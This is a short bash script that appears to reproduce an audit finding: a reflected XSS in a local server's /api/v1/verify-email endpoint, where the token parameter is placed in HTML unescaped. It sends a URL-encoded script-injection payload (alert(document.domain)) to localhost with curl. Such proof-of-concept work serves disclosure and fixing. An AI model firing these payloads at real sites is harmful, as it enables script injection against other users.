#!/usr/bin/env bash
# F-SERVER-01 — Reflected XSS in /api/v1/verify-email
#
# `handleVerifyEmailPage` (server/verify-email.ts) interpolates the user-supplied
# `token` query parameter into an HTML hidden input value WITHOUT escaping.
# Any visitor following a crafted URL gets attacker JS in the server origin.
#
# Reproduction:
#   1. Start the server locally:  deno task server
#   2. Run this script (or visit the URL in a browser):
#        ./F-SERVER-01-verify-email-xss.sh
#
# The server returns HTML in which the unescaped attack string is reflected.

URL='http://localhost:8080/api/v1/verify-email?token=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'

echo "GET $URL"
echo "---"
curl -s "$URL" | head -40
